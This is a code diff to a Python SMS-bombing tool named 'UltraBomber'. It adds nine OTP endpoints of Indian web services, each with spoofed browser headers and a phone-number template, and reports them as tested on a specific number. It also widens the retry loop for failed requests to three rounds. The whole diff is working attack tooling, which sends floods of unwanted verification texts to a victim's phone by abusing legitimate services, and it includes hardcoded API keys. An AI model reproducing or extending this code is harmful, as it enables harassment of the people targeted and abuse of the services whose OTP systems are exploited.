@@ -775,6 +775,62 @@ def get_all_apis():
                   {"X-Verification-Key": "NTk2OTJjNzI3NzAwZDdkYjQxYmM5N2Y1MzlmNTA2NmM=",
                    "X-POCKET-KEY": "FwMqEpp8XHfrR8xBTGiteY62q3NW96ulwqkGeY7lDU7hfYZ7H4DJPITtTZwyfWj1"}),
     ]
+
+    # ====== 9 NEW WORKING APIs (tested on 9919471212) ======
+    sms_apis.append(ApiConfig("Hungama", "https://communication.api.hungama.com/v1/communication/otp", "POST",
+                  {"Content-Type": "application/json", "Accept": "application/json", "identifier": "home",
+                   "mlang": "en", "alang": "en", "country_code": "IN", "vlang": "en",
+                   "origin": "https://www.hungama.com", "referer": "https://www.hungama.com/",
+                   "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/135.0.0.0"},
+                  '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1",'
+                  '"emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}'))
+    sms_apis.append(ApiConfig("GoPinkCabs", "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*",
+                   "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.gopinkcabs.com",
+                   "Referer": "https://www.gopinkcabs.com/app/cab/customer/step1.php",
+                   "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36"},
+                  "check_mobile_number=1&contact={phone}"))
+    sms_apis.append(ApiConfig("SheMeroome", "https://www.shemaroome.com/users/resend_otp", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*",
+                   "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.shemaroome.com",
+                   "Referer": "https://www.shemaroome.com/users/sign_in",
+                   "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36"},
+                  "mobile_no=%2B91{phone}"))
+    sms_apis.append(ApiConfig("NoBroker", "https://www.nobroker.in/api/v3/account/otp/send", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded",
+                   "Origin": "https://www.nobroker.in", "Referer": "https://www.nobroker.in/",
+                   "User-Agent": "Mozilla/5.0 (Linux; Android 10) Chrome/135.0.0.0"},
+                  "phone={phone}&countryCode=IN"))
+    sms_apis.append(ApiConfig("GoKwik", "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "POST",
+                  {"Accept": "application/json", "Content-Type": "application/json",
+                   "gk-merchant-id": "19g6jlc658iad",
+                   "Origin": "https://pdp.gokwik.co", "Referer": "https://pdp.gokwik.co/",
+                   "User-Agent": "Mozilla/5.0 (Linux; Android 10) Chrome/135.0.0.0"},
+                  '{"phone":"{phone}","country":"in"}'))
+    sms_apis.append(ApiConfig("Servetel", "https://api.servetel.in/v1/auth/otp", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded",
+                   "User-Agent": "Dalvik/2.1.0 (Linux; Android 13)"},
+                  "mobile_number={phone}"))
+    sms_apis.append(ApiConfig("Smytten", "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "POST",
+                  {"Content-Type": "application/json", "Accept": "application/json",
+                   "Origin": "https://smytten.com", "Referer": "https://smytten.com/",
+                   "User-Agent": "Mozilla/5.0 (Linux; Android 13) Chrome/131.0.6778.135"},
+                  '{"phone":"{phone}","email":"test@gmail.com"}'))
+    sms_apis.append(ApiConfig("DaycoEkyc", "https://ekyc.daycoindia.com/api/nscript_functions.php", "POST",
+                  {"X-Requested-With": "XMLHttpRequest", "Accept": "application/json",
+                   "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                   "Origin": "https://ekyc.daycoindia.com",
+                   "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
+                   "User-Agent": "Mozilla/5.0 (Linux; Android 10) Chrome/135.0.0.0"},
+                  "api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"))
+    sms_apis.append(ApiConfig("LendingPlate", "https://lendingplate.com/api.php", "POST",
+                  {"X-Requested-With": "XMLHttpRequest", "Accept": "application/json",
+                   "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                   "Origin": "https://lendingplate.com",
+                   "Referer": "https://lendingplate.com/personal-loan",
+                   "User-Agent": "Mozilla/5.0 (Linux; Android 10) Chrome/135.0.0.0"},
+                  "mobiles={phone}&resend=Resend&clickcount=3"))
+
     apis.extend(sms_apis)
     return apis
 
@@ -868,18 +924,23 @@ class UltraBomber:
                 fail_count += 1
                 failed_apis.append(name)
         
-        # SMS AUTO-RETRY: Retry failed APIs immediately in the same round
+        # SMS AUTO-RETRY: Retry failed APIs up to 3 times until they respond
         if is_sms and SMS_AUTO_RETRY and failed_apis:
-            retry_futures = []
-            for api in apis:
-                if api.name in failed_apis[:50]:  # Retry up to 50 failed APIs
-                    retry_futures.append(executor.submit(self._fire_api, api, phone))
-            for f in as_completed(retry_futures):
-                name, status, size, err = f.result()
-                if 200 <= status < 400 and size > 0:
-                    ok_count += 1
-                else:
-                    fail_count += 1
+            for retry_round in range(3):  # 3 retry rounds
+                retry_futures = []
+                for api in apis:
+                    if api.name in failed_apis[:50]:
+                        retry_futures.append(executor.submit(self._fire_api, api, phone))
+                if not retry_futures:
+                    break
+                failed_apis = []
+                for f in as_completed(retry_futures):
+                    name, status, size, err = f.result()
+                    if 200 <= status < 400 and size > 0:
+                        ok_count += 1
+                    else:
+                        fail_count += 1
+                        failed_apis.append(name)
         
         return ok_count, fail_count
 
